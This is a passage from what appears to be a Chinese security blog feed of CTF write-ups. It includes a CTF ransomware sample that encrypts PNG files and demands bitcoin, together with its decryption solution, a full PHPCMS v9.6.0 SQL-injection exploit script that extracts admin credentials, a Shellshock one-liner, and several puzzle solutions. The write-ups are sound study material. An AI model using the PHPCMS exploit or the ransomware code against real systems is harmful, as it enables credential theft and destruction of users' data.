BytesIOIMG="""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"""MSG="""This Image is encrypted by WannaFly Ransom-ware. If you want your original image back, feel free to contact us on sha2017ctf@gmail.com and make a bitcoin payment of 0.1 bitcoin to address 1QCc1EYncxTeSfTKpaCZ2hvMDwXULKRVWe"""def get_iv(): iv = "" random.seed(int(time())) for i in range(0,16): iv += random.choice(string.letters + string.digits) return ivdef encrypt(m, p): iv=get_iv() aes = AES.new(p, AES.MODE_CFB, iv) return base64.b64encode(aes.encrypt(m))def decrypt(m, p, i): aes = AES.new(p, AES.MODE_CFB, i) return aes.decrypt(base64.b64decode(m))def find_images(): i = [] #for r, d, f in os.walk(os.environ['HOME']): for r, d, f in os.walk("."): for g in f: if g.endswith(".png"): i.append((os.path.join(r, g))) return idef encrypt_images(): for i in find_images(): img = Image.open(i).filter(ImageFilter.GaussianBlur(radius=18)) draw = ImageDraw.Draw(img) font = ImageFont.truetype("/usr/share/fonts/truetype/freefont/FreeSans.ttf", 18) text = textwrap.wrap(MSG, width=60) W, H = img.size bird = Image.open(BytesIO(base64.b64decode(IMG))) bw, bh = bird.size offset = ((W-bw)/2, (H-bh)/2 - 80) img.paste(bird, offset, bird) pad = 0 for line in text: w, h = draw.textsize(line, font=font) draw.text(((W-w)/2, (H-h)/2 + pad), line, font=font, fill="white") pad += 20 img.save('/tmp/sha.png') encrypt_image(i)def encrypt_image(img): data = open(img, 'r').read() encrypted_img = encrypt(data, sys.argv[1]) blurred_img = open('/tmp/sha.png', 'r').read() stat = os.stat(img) with open(img, 'r+') as of: of.write('\0' * stat.st_size) of.flush() open(img, 'w').write(blurred_img + "\n" + encrypted_img)if __name__ == '__main__': if len(sys.argv) != 2: print "Usage: %s &lt;pass&gt;" % sys.argv[0] else: encrypt_images() 可以看出这是一个加密脚本。其调用过程如下： 调用find_images()找到png文件， 先根据png文件生成一张“模糊”的图片并保存到sha.png中， 接着调用encrypt_image(img)。 先把原图片进行了一次encrypt()加密，得到encrypted_img 读取之前生成的sha.png文件，作为blurred_img 将blurred_img + “\n” + encrypted_img 的内容写入图片文件。 用十六进制编辑器打开可以验证。图片中0A即为10，这是”\n”的的十六进制表示。之前的数据即为blurred_img，之后的数据即为encrypted_img。 接下来我们看看怎么进行encrypt()函数。encrypt()加密使用了AES加密。要对密文解密的话，我们可以调用decrypt(m, p, i)，这需要三个参数，m即加密后的数据，p即密钥，i即偏移量。 m是加密后的数据，直接打开图片进行提取就行。 p是密钥。在运行脚本是通过命令行参数读入。结合之前得到的.bash_history中的chmod +x ... ./... Hb8jnSKzaNQr5f7p，我们推测Hb8jnSKzaNQr5f7p即为密钥。 i是偏移量，通过get_iv()生成。其中使用int(time())来作为生成伪随机数的种子。图片的修改时间是可以获得的。所以i，我们也得到了。 exp脚本如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344from Crypto.Cipher import AESimport base64import randomimport stringimport osdef find_images(): i = [] for r, d, f in os.walk("."): for g in f: if g.endswith(".png"): i.append((os.path.join(r, g))) return idef get_iv(time): iv = "" random.seed(int(time)) for i in range(0,16): iv += random.choice(string.letters + string.digits) return ivdef decrypt(m, p, i): aes = AES.new(p, AES.MODE_CFB, i) return aes.decrypt(base64.b64decode(m))p = "Hb8jnSKzaNQr5f7p"for i in find_images(): new_img_name = i[len("./Pictures/"):-4] old_img = open(i, 'r').read() data = old_img[old_img.find("IEND")+9:] print(data[0:5]) old_img_time = os.stat(i).st_mtime new_img_name = str(old_img_time) + new_img_name iv = get_iv(old_img_time) # print(iv) new_img = open(new_img_name,"wb") new_img.write(decrypt(data,p,iv)) new_img.close() 其中old_img_time = os.stat(i).st_mtime，是为了获得图片的修改时间。 运行后会得到一些图片。其中一张如下： 得到flag：1flag&#123;ed70550afe72e2a8fed444c5850d6f9b&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHPCMS v9.6.0 wap模块sql注入漏洞分析]]></title>
      <url>%2F2017%2F08%2F04%2F%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[PHPCMS v9.6.0 wap模块sql注入漏洞分析 漏洞分析在/phpcms/modules/content/down.php中，约莫第11行：12345678910111213141516public function init() &#123; $a_k = trim($_GET['a_k']); if(!isset($a_k)) showmessage(L('illegal_parameters')); $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key')); if(empty($a_k)) showmessage(L('illegal_parameters')); unset($i,$m,$f); parse_str($a_k); if(isset($i)) $i = $id = intval($i); if(!isset($m)) showmessage(L('illegal_parameters')); if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters')); if(empty($f)) showmessage(L('url_invalid')); $allow_visitor = 1; $MODEL = getcache('model','commons'); $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid]['tablename']; $this-&gt;db-&gt;table_name = $tablename.'_data'; $rs = $this-&gt;db-&gt;get_one(array('id'=&gt;$id)); 首先，通过GET方法得到参数$a_k。在经过sys_auth解密(里面有个DECODE)后，对$a_k进行了一次parse_str($a_k)，parse_str()会把字符串解析到对ing的变量中。在经过解析后，通过语句$rs = $this-&gt;db-&gt;get_one(array(&#39;id&#39;=&gt;$id));将变量id带入查询。所以目标是寻找一个能加密的地方，并且能够回显给我们，这样就能构造参数$a_k，并造成注入。 在 /phpcms/modules/attachment/attachments.php 中，约莫第239行123456789101112131415public function swfupload_json() &#123; $arr['aid'] = intval($_GET['aid']); $arr['src'] = safe_replace(trim($_GET['src'])); $arr['filename'] = urlencode(safe_replace($_GET['filename'])); $json_str = json_encode($arr); $att_arr_exist = param::get_cookie('att_json'); $att_arr_exist_tmp = explode('||', $att_arr_exist); if(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) &#123; return true; &#125; else &#123; $json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str; param::set_cookie('att_json',$json_str); return true; &#125; &#125; 通过GET方法得到参数$arr[‘src’]，先经过safe_replace()过滤。我们先看一下safe_replace()函数。12345678910111213141516function safe_replace($string) &#123; $string = str_replace('%20','',$string); $string = str_replace('%27','',$string); $string = str_replace('%2527','',$string); $string = str_replace('*','',$string); $string = str_replace('"','&amp;quot;',$string); $string = str_replace("'",'',$string); $string = str_replace('"','',$string); $string = str_replace(';','',$string); $string = str_replace('&lt;','&amp;lt;',$string); $string = str_replace('&gt;','&amp;gt;',$string); $string = str_replace("&#123;",'',$string); $string = str_replace('&#125;','',$string); $string = str_replace('\\','',$string); return $string;&#125; 将%27等关键字过滤。但是利用“*”会被直接过滤为空这点，假设传入的$string为%2*7,则在替换后，会变成%27，从而获得单引号，其余可类似绕过。 接下来继续运行。若不满足条件，会进入set_cookie()函数，具体如下：12345678910111213public static function set_cookie($var, $value = '', $time = 0) &#123; $time = $time &gt; 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0); $s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0; $var = pc_base::load_config('system','cookie_pre').$var; $_COOKIE[$var] = $value; if (is_array($value)) &#123; foreach($value as $k=&gt;$v) &#123; setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125; &#125; else &#123; setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s); &#125;&#125; 其中，会将传入的参数进行一次加密sys_auth($value, ‘ENCODE’)，这正好满足我们前面的需求。 为了能访问到swfupload_json()，我们需要一个cookie。这样在访问时才不会直接跳转到登陆也main。接下来就是寻找能够给我们提供这次setcookie机会的接口。比如说wap模块。在 /phpcms/modules/wap/index.php 中，约莫第6行1234function __construct() &#123; $this-&gt;db = pc_base::load_model('content_model'); $this-&gt;siteid = isset($_GET['siteid']) &amp;&amp; (intval($_GET['siteid']) &gt; 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1); param::set_cookie('siteid',$this-&gt;siteid); 通过GET方法得到$siteid，然后传到了set_cookie()函数中，满足条件。 利用利用步骤 访问 /index.php?m=wap&amp;a=index&amp;siteid=1 。获取响应头的set-Cookie字段。 将前一步获取到的字段赋值给userid_flash，作为POST参数。访问 /index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=【payload】 获取返回头的set—Cookie字段，此即为加密后的payload 访问 /index.php?m=content&amp;c=down&amp;a_k=【加密后的payload】，注入成功。 cmsPoc开源CMS渗透测试框架 cmsPoc中已集成了利用脚本 v960_sqlinject_getpasswd.py。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from lib.core.data import targetimport requests,sys,urllibdef poc(): try: url = target.url sqli_prefix = '%*27an*d%20' sqli_info = 'updatexml(1,concat(1,(user())),1)' sqli_password1 = 'updatexml(1,concat(1,(select concat(0x6368796265746124,username,0x3a,password,0x3a,encrypt,0x6368796265746124) from ' sqli_password2 = '_admin limit 0,1)),1)' sqli_padding = '%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6' step1 = url + '/index.php?m=wap&amp;a=index&amp;siteid=1' r = requests.get(step1) post = &#123;"userid_flash":r.cookies["GPYAh_siteid"]&#125; print('[+] Get Cookie : ' + r.cookies["GPYAh_siteid"]) step2 = url + "/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=" + sqli_prefix + sqli_info+ sqli_padding r = requests.post(step2,data=post) sqli_payload = r.cookies["GPYAh_att_json"] print('[+] Get SQLi Payload : ' + sqli_payload) step3 = url + '/index.php?m=content&amp;c=down&amp;a_k=' + sqli_payload html = requests.get(step3).text db_start = html.find("SELECT * FROM `") + len("SELECT * FROM `") db_end = html.find("`.`") Database = html[db_start:db_end] print("[+] Get Database Name: "+ Database) tableprefix_start = html.find("`.`") + len("`.`") tableprefix_end = html.find("_download_data") tableprefix = html[tableprefix_start:tableprefix_end] print("[+] Get Table Prefix: "+ tableprefix) startIndex = html.find("XPATH syntax error: '") + len("XPATH syntax error: '") endIndex = html.find("' &lt;br /&gt; &lt;b&gt;MySQL Errno") database_user = html[startIndex:endIndex] print("[+] Get Database-user Information : " + database_user) step4 = url + "/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=" + sqli_prefix + sqli_password1+ tableprefix + sqli_password2 + sqli_padding r = requests.post(step4,data=post) sqli_payload = r.cookies["GPYAh_att_json"] setp5 = url + '/index.php?m=content&amp;c=down&amp;a_k=' + sqli_payload html = requests.get(setp5).text startIndex = html.find("XPATH syntax error: '") + len("XPATH syntax error: '") endIndex = html.find("' &lt;br /&gt; &lt;b&gt;MySQL Errno") admin_passwd = html[startIndex:endIndex] print("[+] Get User Passwd: " + admin_passwd) print("\033[33m[*] Complete this task: &#123;&#125; \033[0m".format(target.url)) except KeyError as e: print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m") 本文收录于：【gitbook:Vuln-Time】]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:shellshock]]></title>
      <url>%2F2017%2F08%2F01%2FPwnable-kr-shellshock%2F</url>
      <content type="text"><![CDATA[bash破壳漏洞应用。 题目1234567#include &lt;stdio.h&gt;int main()&#123; setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system("/home/shellshock/bash -c 'echo shock_me'"); return 0;&#125; exp有名的bash破壳漏洞。所以这里不展开了。直接给出exp：123shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; /bin/cat flag&apos; ./shellshockonly if I knew CVE-2014-6271 ten years ago..!!Segmentation fault]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:mistake]]></title>
      <url>%2F2017%2F08%2F01%2FPwnable-kr-mistake%2F</url>
      <content type="text"><![CDATA[操作符优先级问题。c语言中=优先级为14，而&lt;优先级为6。 题目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; 分析程序的功能，就是我们输入的十个字符进行xor处理后保存在pw_buf2中，与pw_buf进行比较，若相同则得到flag。 问题出在下面这段代码中：1234if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0;&#125; 由于&lt;的优先级比=高，所以在open()执行完后，不论是否打开成功，其返回值都大于或者等于零。所以在与0比较后，fd的值为false，在c语言中，即为0。 所以当程序执行到：12345if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf(&quot;read error\n&quot;); close(fd); return 0; &#125; 实际上执行的是：1if(!(len=read(0,pw_buf,PW_LEN) &gt; 0)) 而在unix中，0表示为标准输入流，read(0,pw_buf,PW_LEN)即为从标准输入流中读取字符并保存到pw_buf中。 所以实际上，两个数组的内容都是我们输入的。 exp第一次输入时输入十个字符，比如十个1：11111111111 第二次输入时输入第一次输入十个字符经过异或后的结果：10000000000 flag：1234567891011mistake@ubuntu:~$ ./mistakedo not bruteforce...2input password : 0Wrong Passwordmistake@ubuntu:~$ ./mistakedo not bruteforce...1111111111input password : 0000000000Password OKMommy, the operator priority always confuses me :(]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-Reverse-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-Reverse-writeup%2F</url>
      <content type="text"><![CDATA[单刷好幸苦。 only guess用IDA打开 dict数组保存了各种字符串： 基本逻辑就是读入的pass和数组dict比较，同时&amp;dest和数组dict的值比较，若一样则为good password。所以实际上&amp;dest就是我们要输入的值。1234567891011#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;int main()&#123; char dest; long long src = 0x736564656372656d; memcpy(&amp;dest, &amp;src, 9uLL); printf("%s",&amp;dest); return 0;&#125; 但是我测试时只输出了mercede?(，所以这不是最后的password，需要修正。想了一个曲线救国的方法。用命令strings re50 &gt; tmp把数组dict中的内容输出到tmp文件中，在tmp文件中查找开头为mercede的值。最终确定password为：1mercedes 最终的flag:1Bugs_Bunny&#123;mercedes&#125; rev100拖进IDA查看。 main函数中，将A，B两处的字符串拷贝后进行异或并存储到C中。用下面的脚本得到flag： 123456789str1 = [0x61,0x41,0x40,0x37,0x6d,0x77,0x34,0x2c,0x5f,0x41,0x42,0x60,0x7,0x34,0x7d,0x12,0x57,0x7a,0x22,0x25,0x4f,0x28]str2 = [0x23,0x34,0x27,0x44,0x32,0x35,0x41,0x42,0x31,0x38,0x39,0x38,0x37,0x46,0x22,0x23,0x24,0x25,0x44,0x50,0x21,0x55]str3 = ""for i in range(len(str2)): str3 += chr(str1[i] ^ str2[i])print str3 得到flag：1Bugs_Bunny&#123;X0r_1s_fun&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-misc-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-misc-writeup%2F</url>
      <content type="text"><![CDATA[单刷好幸苦。 MISCNot found1hidden in plain sight 在注册时时候就注意到有irc页面，连上去后得到flag1Bugs_Bunny&#123;Th1s_1s_0ur_fl4g_f0rm4t&#125; Primitive encryption题目给了如下信息：12345What about a time travel ? ^^Your mission is to be very observative, sometimes a theory start from a supposition.Decrypt this and you will get your flag :i KTAX ZTRTRTC SuB AKXy KXlp you GiRViRF youN GlTF TRV iA&apos;C FFAKTAwTCXTCyTo validate the challenge enter : Bugs_Bunny&#123;your_flag_uppercase&#125; 考虑语义，进行如下替换：12345678910K -&gt; hX -&gt; eN -&gt; rA -&gt; tC -&gt; sT -&gt; aR -&gt; RV -&gt; eG -&gt; FF -&gt; g 得到：1i hate Zararas SuB they help you fireirg your flag are it&apos;s ggthatwaseasy 将ggthatwaseasy改成大写加上外围后得到flag：1Bugs_Bunny&#123;GGTHATWASEASY&#125; Like a Boss !1Put the flag between Bugs_Bunny&#123;&#125; Locked PDF1My girlfriend sent me a locked PDF file ,Can you please helps me to read the content ,maybe something great waiting fro me ?!! :p SteganographyStego10题目提供了一张图片。123456root@chybeta:~/Desktop/bug/steg# strings h4cker.jpgJFIF`ExifGoogle0220.Bugs_Bunny&#123;0258c4a75fc36076b41d02df8074372b&#125; odd &amp; even 212345odd and even are two friends since ever.Can you detach them.Be the devil and do it.flag : BUGS_BUNNY&#123;&#125; ForensicsFOR251I found this file in my computer ,could you please give me the flag ?! 直接用strings看一下。 用以下脚本提取出hex。123456789file = open(&apos;hex&apos;,&apos;rb&apos;)output = open(&apos;output&apos;,&apos;wb&apos;)while True: line = file.readline() output.write(line[9:48]+&quot;\n&quot;) if not line: breakfile.close()output.close() 然后将output中的内容放到hex编辑器中并保存在压缩包文件。压缩包中有文件hex.png。得到flag：1Bugs_Bunny&#123;Y0u_D1D_1T_W3ll&#125; UNKOWN file !!1? em rof ti evlos esaelp uoy dluoc, rekcah boon a m&apos;I, elif egnarts a em dnes evah dneirf ym 题目是倒这个，这是个提示。用hex打开unknown文件，发现是个png文件，只是被倒序了。将其十六进制内容保存在unknownhex.txt中，用下面这个脚本转换一下：12345678unknowhex = open(&apos;unkownhex.txt&apos;,&apos;rb&apos;)knowhex = open(&apos;knowhex.txt&apos;,&apos;wb&apos;)content = unknowhex.readline()content = content.split(&apos; &apos;)for i in content[::-1]: knowhex.write(i+&apos; &apos;)unknowhex.close()knowhex.close() 再把knowhex.txt的内容放到hex编辑器中并保存成png文件。打开后是倒着的flag。最后的flag为：1Bugs_Bunny&#123;E4Sy_T4Sk_F0R_H4X0r_L1KeS_Y0u&#125; For80把gif传到这网站后，进行split。但是图片很不清晰。然后我选择把分帧的图片下载下来。其目录结构差不多如下：然后用下面这个脚本写个html页面，用这些分帧图片进行填充。12345html = open("flag.html","wb")for i in range(310): img = '&lt;img src="img/frame_' + str(i)+ '_delay-0.01s.gif" /&gt;' html.writelines(img)html.close() 有些地方重叠了，但不妨碍最后的flag：1Bugs_Bunny&#123;S3nD_NuDes_DuD3&#125; Give me the Flag !task85的压缩包解压出来后有个flag.rar和flag文件夹。flag文件夹里有各种国旗还有二维码碎片。而flag.rar被加密了。初步推测通过回复二维码来解密压缩包。拼了好久。。 扫码得到：1== 34Sy_P4SSW0Rd_H4X0r == 直接解压得到的flag.txt里有flag。直接打开压缩包里面有个readme.txt，输入密码后其内容为：101000010 01110101 01100111 01110011 01011111 01000010 01110101 01101110 01101110 01111001 01111011 00110010 01100010 00111001 00110111 00110010 00110110 00110011 01100010 01100101 01100010 00110111 00110000 01100100 00110000 01100110 00110110 00110101 00111001 01100010 01100100 01100010 00111001 00110011 01100011 01100011 00110101 00110010 00111001 00110001 01100100 00110000 01100001 01111101 放到 http://tool.ph0en1x.com 上解一下，得到flag：1Bugs_Bunny&#123;2b97263beb70d0f659bdb93cc5291d0a&#125; ProgramationZERO-ONE !写程序把ZERON,ONE换成对应的0，1，之后再解码就行了。脚本如下：123progfile = open("progTask.txt","rb")content = progfile.readline()print(content.replace("ZERO",'0').replace("ONE","1").replace(" ","")) 在 http://tool.ph0en1x.com 放入bin一栏，在ascii一栏得到如下：1QnVnc19CdW5ueXswNWZlODIzOGNmZWUxZTVmMDRiNjUzMzliZWE0ZmVkMn0= 进行base64解码，得到flag：1Bugs_Bunny&#123;05fe8238cfee1e5f04b65339bea4fed2&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugsBunnyCTF2017-crypto-writeup]]></title>
      <url>%2F2017%2F07%2F30%2FBugsBunnyCTF2017-crypto-writeup%2F</url>
